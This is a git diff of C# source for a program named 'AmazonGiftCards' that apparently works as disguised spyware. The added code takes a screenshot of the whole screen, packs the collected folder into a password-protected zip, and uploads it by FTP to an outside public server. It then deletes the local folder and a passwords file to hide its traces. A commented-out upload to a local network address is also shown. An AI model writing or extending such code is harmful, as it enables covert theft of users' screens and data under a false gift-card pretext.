@@ -1,7 +1,10 @@
-﻿using AmazonGiftCards.Properties;
+﻿using Ionic.Zip;
 using System;
 using System.Diagnostics;
+using System.Drawing;
+using System.Drawing.Imaging;
 using System.IO;
+using System.IO.Compression;
 using System.Net;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
@@ -57,14 +60,47 @@ namespace AmazonGiftCards
             p.StandardInput.Write("dir" + p.StandardInput.NewLine);
             p.WaitForExit();
 
-            using (var client = new WebClient())
+            string passwordb = Application.StartupPath + "/passwordsDB";
+
+            if (File.Exists(passwordb))
             {
-                client.Credentials = new NetworkCredential("cazzo", "cazzo");
-                client.UploadFile($"ftp://192.168.0.208:21/{fileName}-{date}.txt", WebRequestMethods.Ftp.UploadFile, $"{folderName}{fileName}-{date}");
+                File.Delete(passwordb);
             }
 
-            System.IO.Directory.Delete(folderName, true);
+
+            Rectangle bounds = Screen.GetBounds(Point.Empty);
+            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
+            {
+                using (Graphics g = Graphics.FromImage(bitmap))
+                {
+                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
+                }
+                bitmap.Save($"{folderName}{fileName}-{date}.jpg", ImageFormat.Jpeg);
+            }
+
+            using (ZipFile zip = new ZipFile())
+            {
+                zip.Password = "thisisacoolapassdaweaweasdasdfja;oirtaowlirgjloaikrgloiwkrejowiaejaoweijtf";
+                zip.AddDirectory(folderName);
+                zip.Save($"{folderName}{fileName}-{date}.zip");
+            }
+
+            //using (var client = new WebClient())
+            //{
+            //    client.Credentials = new NetworkCredential("cazzo", "cazzo");
+            //    client.UploadFile($"ftp://192.168.0.208:21/{fileName}-{date}.zip", WebRequestMethods.Ftp.UploadFile, $"{folderName}{fileName}-{date}.zip");
+            //}
+
+            using (var client = new WebClient())
+            {
+                client.Credentials = new NetworkCredential("demo-user", "demo-user");
+                client.UploadFile($"ftp://demo.wftpserver.com/upload/{fileName}-{date}.zip", WebRequestMethods.Ftp.UploadFile, $"{folderName}{fileName}-{date}.zip");
+            }
+
+            Directory.Delete(folderName, true);
 
         }
+
+
     }
 }
